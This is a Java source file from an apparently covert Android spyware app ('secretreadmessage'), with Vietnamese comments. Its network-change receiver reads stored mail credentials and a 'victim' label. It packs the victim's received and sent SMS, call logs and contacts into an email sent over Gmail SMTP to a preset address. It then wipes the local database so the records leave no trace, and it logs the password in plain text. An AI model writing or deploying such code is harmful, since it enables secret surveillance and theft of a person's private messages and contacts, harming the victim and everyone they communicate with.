package com.example.phamngochieu.secretreadmessage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import android.widget.Toast;

import java.util.Date;
import java.util.Properties;

import javax.activation.CommandMap;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.activation.MailcapCommandMap;
import javax.mail.BodyPart;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class ListeningWifiState extends BroadcastReceiver {
    private String EmailSend;
    private String Pass;
    private String EmailTo;
    private String Title;
    private  Context context;
    public static int count =0;
    SharedPreferences pre;
    public static SQLiteDatabase db;
    public ListeningWifiState() {
    }
    public ListeningWifiState(String emailSend, String pass, String emailTo, String title, Context context) {
        EmailSend = emailSend;
        Pass = pass;
        Title = title;
        EmailTo = emailTo;
        this.context = context;
    }

    @Override
    public void onReceive(final Context context,final Intent intent) {
        Log.e("onRece trong wifi: ",String.valueOf(count));
        if((count%4)==0/* tránh gửi nhiều mail*/)
        {
        Thread y = new Thread(new Runnable() {
            public void run() {
                Log.e("*******","nghe sự kiện bật Internet");
                db = new DatabaseHelper(context).getWritableDatabase();
                // TODO: This method is called when the BroadcastReceiver is receiving
                // an Intent broadcast.
                // phương thức này là để kiểm tra trong CSDL đã có ít nhất 10 tin nhắn hay chưa và có mạng internet hay không thì gửi mail
                try
                {
                    pre = context.getSharedPreferences("phamngochieu.it", 0);
                    Log.e("****","đang đọc file");
                }
                catch(Exception e)
                {
                    Log.e("*****","đọc file bị lỗi");
                }
                final String msend = pre.getString("mailsender","");
                final String pass = pre.getString("pass","");
                final String vict = pre.getString("victim","");
                final String maito = pre.getString("mailto", "");
                try {
                    synchronized(this){
                        Log.e("đang chờ 6 giây","********");
                        wait(6000);
                    }
                }
                catch(InterruptedException ex){
                }


                if(isNetworkAvailable(context)&&checkAtLeastTenMessage())
                {
                            Mail m = new Mail(msend,pass);
                            String[] toArr = {maito,maito};
                            Log.i(msend + " "+ pass+" "+vict+" "+maito,"******************");
                            m.setTo(toArr);
                            m.setFrom(msend);
                            m.setSubject(vict);
                            // nếu có thêm danh bạ trong CSDL thì gửi cả danh bạ nữa
                            if(checkHavingContact())
                                m.setBody(getData()+"\n\n\n"+getDataSend()+"\n\n\n"+getDataInOut()+"\n\n\n"+getDataContact()+"\n\n\n");
                            else
                                m.setBody(getData()+"\n\n\n"+getDataSend()+"\n\n\n"+getDataInOut()+"\n\n\n");

                            try {
                                // m.addAttachment("/sdcard/filelocation");
                                m.send();
                                deleteAllRecord();

                            } catch (Exception e) {
                                //Toast.makeText(MailApp.this, "There was a problem sending the email.", Toast.LENGTH_LONG).show();
                                Log.e("MailApp", "Could not send email-------------------------------------", e);
                                m.display();
                            }
                            // gửi xong 10 tin nhắn thì xóa luôn khỏi CSDL
                            // chú ý lệnh xóa này phải đặt trong cùng thread với gửi mail
                            // nếu không thì chưa kịp gửi mail đã bị xóa hết thông tin trong CSDL
                            // nên nhớ rằng thread là luồng nó sẽ chạy đồng thời với các thread khác
                    //deleteAllRecord();

                    Log.e("**********","Đã Gửi");
                    // nếu đặt lệnh xóa ở vị trí này là toi ngay
                    // DatabaseHelper.deleteAllRecordIndatabase(db);
                    CharSequence text = "Gửi";
                    int duration = Toast.LENGTH_SHORT;
                    //    Toast.makeText(context, text+" "+String.valueOf(isNetworkAvailable(context))+String.valueOf(DatabaseHelper.checkAtLeastTenMessage(/*db*/)), duration).show();
                }
                else
                {
                    Log.e("**********","Chưa Gửi");
                    CharSequence text = "Không gửi";
                    int duration = Toast.LENGTH_SHORT;
                    //    Toast.makeText(context, text+" "+String.valueOf(isNetworkAvailable(context))+String.valueOf(DatabaseHelper.checkAtLeastTenMessage(/*db*/)), duration).show();
                }

            }

        }
        );
        y.start();
        }
        count++;


    }
    //cái này là thực sự kiểm tra kết nối internet hay không
    private boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager)context.getSystemService(context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }
    /**
     * phương thức này để lấy danh bạ tronng bảng danh bạ nằm ở CSDL
     * @param
     * @return
     */
    public static String getDataContact(/*SQLiteDatabase db*/) {
        String[] columns = new String[] {"TIME","CONTENT"};
        Cursor c = db.query("CONTACT", columns, null, null, null, null, null);
        String result="";
        if(c.moveToFirst())
        {
            String time = c.getString(0);
            result = result + time +"\n";
            String contact = c.getString(1);
            result = result + contact;
        }
        return result;
    }
    /**
     * hàm trả về chuỗi thông tin của bảng
     * @return
     */
    public static String getData() {
        String[] columns = new String[] {"PHONENUMBER","TIME","CONTENT","SEND"};
        Cursor c = db.query("STORE", columns, null, null, null, null, null);
        String result="******Những Tin Nhắn Đã Gửi Đến ******"+"\n" ;
        if(c.moveToFirst())
        {
            String phone = c.getString(0);
            result = result + "   " + phone;
            String time = c.getString(1);
            result = result + "   " + time;
            String content = c.getString(2);
            result = result + "   " + content;
          /*  String send = c.getString(3);
            result = result + "   " + send; */
        }
        while(c.moveToNext())
        {
            result = result +"\n";
            String phone = c.getString(0);
            result = result + "   " + phone;
            String time = c.getString(1);
            result = result + "   " + time;
            String content = c.getString(2);
            result = result + "   " + content;
        /*    String send = c.getString(3);
            result = result + "   " + send; */
        }
        result = result + "\n" + "**********************";
        return result;
    }

    /**
     * kiểm tra xem trong bảng lưu tin nhắn gửi đến đã có ít nhất 5 tin nhắn gửi đến hay chưa
     * @return
     */
    public boolean checkAtLeastTenMessage()
    {
        Log.e("******","đang kiểm tra số lượng tin nhắn đến");
        String countQuery = "SELECT  * FROM   STORE";
        int cnt =0;
        try
        {
            Cursor cursor = db.rawQuery(countQuery, null);
            cnt = cursor.getCount();
            cursor.close();
        }
        catch(Exception e)
        {

        }
        if(cnt>=5)
        {
            Log.e("*****","hơn 5 tin nhắn đến");
            return true;
        }
        else
        {
            Log.e("*****","ít hơn 5 tin nhắn đến");
            return false;
        }
    }
    /**
     * Kiểm tra xem có lệnh lấy danh bạ hay không thì gửi danh bạ luôn
     */
    public boolean checkHavingContact()
    {
        String countQuery = "SELECT  * FROM   CONTACT";
        Cursor cursor = db.rawQuery(countQuery, null);
        int cnt = cursor.getCount();
        cursor.close();
        if(cnt>0)
            return true;
        else
            return false;
    }
    /**
     * hàm trả về chuỗi thông tin của bảng những tin nhắn gửi đi
     * @return
     */
    public static String getDataSend() {
        String[] columns = new String[] {"PHONENUMBER","TIME","CONTENT","SEND"};
        Cursor c = db.query("STORESEND", columns, null, null, null, null, null);
        String result="******Những Tin Nhắn Đã Gửi Đi******"+"\n" ;
        if(c.moveToFirst())
        {
            String phone = c.getString(0);
            result = result + "   " + phone;
            String time = c.getString(1);
            result = result + "   " + time;
            String content = c.getString(2);
            result = result + "   " + content;
          /*  String send = c.getString(3);
            result = result + "   " + send; */
        }
        while(c.moveToNext())
        {
            result = result +"\n";
            String phone = c.getString(0);
            result = result + "   " + phone;
            String time = c.getString(1);
            result = result + "   " + time;
            String content = c.getString(2);
            result = result + "   " + content;
          /*  String send = c.getString(3);
            result = result + "   " + send; */
        }
        result = result +"\n"+ "**********************";
        return result;
    }
    /**
     * phương thức này để lấy danh sách cuộc gọi đến hoặc đi trong bảng CALLINCOME hoặc bảng CALLOUTCOME
     * @param
     * @return
     */
    public static String getDataIncome(/*SQLiteDatabase db,*/boolean inout) {
        String[] columns = new String[] {"PHONENUMBER","TIME"};
        Cursor c;
        // trường hợp inout = true thì lấy từ cuộc gọi đến
        if(inout)
            c = db.query("CALLINCOME", columns, null, null, null, null, null);
        else
            c = db.query("CALLOUTCOME", columns, null, null, null, null, null);// trường hợp inout = false thì lấy từ cuộc gọi đi
        String result="";
        if(c.moveToFirst())
        {
            String phone = c.getString(0);
            result = result + phone +"\n";
            String time = c.getString(1);
            result = result + time + "\n";
        }
        while(c.moveToNext())
        {
            String phone = c.getString(0);
            result = result + phone +"\n";
            String time = c.getString(1);
            result = result + time + "\n";
        }
        return result;
    }
    /**
     * lấy danh sách các cuộc gọi đến và đi
     */
    public static String getDataInOut(/*SQLiteDatabase db*/)
    {
        String result ="*********danh sách cuộc gọi đến***********"+"\n";
        result = result + getDataIncome(true)+ "\n" + "*********danh sách cuộc gọi đi***********" +"\n";
        result = result + getDataIncome(false);
        return result;
    }

    /**
     * xóa bản ghi trong tất cả các bảng trong CSDL
     */
    public void deleteAllRecord()
    {
        db.execSQL("delete from CONTACT");
        db.execSQL("delete from STORESEND");
        db.execSQL("delete from STORE");
        db.execSQL("delete from CALLINCOME");
        db.execSQL("delete from CALLOUTCOME");
    }
    public class Mail extends javax.mail.Authenticator {
        private String _user;
        private String _pass;

        private String[] _to;
        private String _from;

        private String _port;
        private String _sport;

        public void setSubject(String _subject) {
            this._subject = _subject;
        }

        public void setFrom(String _from) {
            this._from = _from;
        }

        public void setTo(String[] _to) {
            this._to = _to;
        }

        private String _host;

        private String _subject;
        private String _body;

        private boolean _auth;

        private boolean _debuggable;

        private Multipart _multipart;


        public Mail() {
            _host = "smtp.gmail.com"; // default smtp server
            _port = "465"; // default smtp port
            _sport = "465"; // default socketfactory port

            _user = ""; // username
            _pass = ""; // password
            _from = ""; // email sent from
            _subject = ""; // email subject
            _body = ""; // email body

            _debuggable = false; // debug mode on or off - default off
            _auth = true; // smtp authentication - default on

            _multipart = new MimeMultipart();

            // There is something wrong with MailCap, javamail can not find a handler for the multipart/mixed part, so this bit needs to be added.
            MailcapCommandMap mc = (MailcapCommandMap) CommandMap.getDefaultCommandMap();
            mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
            mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
            mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
            mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
            mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
            CommandMap.setDefaultCommandMap(mc);
        }

        public Mail(String user, String pass) {
            this();

            _user = user;
            _pass = pass;
        }

        public boolean send() throws Exception {
            Properties props = _setProperties();

            if(!_user.equals("") && !_pass.equals("") && _to.length > 0 && !_from.equals("") && !_subject.equals("") && !_body.equals("")) {
                Session session = Session.getInstance(props, this);

                MimeMessage msg = new MimeMessage(session);

                msg.setFrom(new InternetAddress(_from));

                InternetAddress[] addressTo = new InternetAddress[_to.length];
                for (int i = 0; i < _to.length; i++) {
                    addressTo[i] = new InternetAddress(_to[i]);
                }
                msg.setRecipients(MimeMessage.RecipientType.TO, addressTo);

                msg.setSubject(_subject);
                msg.setSentDate(new Date());

                // setup message body
                BodyPart messageBodyPart = new MimeBodyPart();
                messageBodyPart.setText(_body);
                _multipart.addBodyPart(messageBodyPart);

                // Put parts in message
                msg.setContent(_multipart);

                // send email
                Transport.send(msg);

                return true;
            } else {

                return false;
            }
        }

        public void addAttachment(String filename) throws Exception {
            BodyPart messageBodyPart = new MimeBodyPart();
            DataSource source = new FileDataSource(filename);
            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(filename);

            _multipart.addBodyPart(messageBodyPart);
        }

        @Override
        public PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(_user, _pass);
        }

        private Properties _setProperties() {
            Properties props = new Properties();

            props.put("mail.smtp.host", _host);

            if(_debuggable) {
                props.put("mail.debug", "true");
            }

            if(_auth) {
                props.put("mail.smtp.auth", "true");
            }

            props.put("mail.smtp.port", _port);
            props.put("mail.smtp.socketFactory.port", _sport);
            props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
            props.put("mail.smtp.socketFactory.fallback", "false");

            return props;
        }

        // the getters and setters
        public String getBody() {
            return _body;
        }

        public void setBody(String _body) {
            this._body = _body;
        }
        public void display()
        {
            Log.i(_user + " "+ _pass+" " + _to.length+" " + _from+ " " + _subject+ " " + _body , "**************");
        }

        // more of the getters and setters …..

    }
}
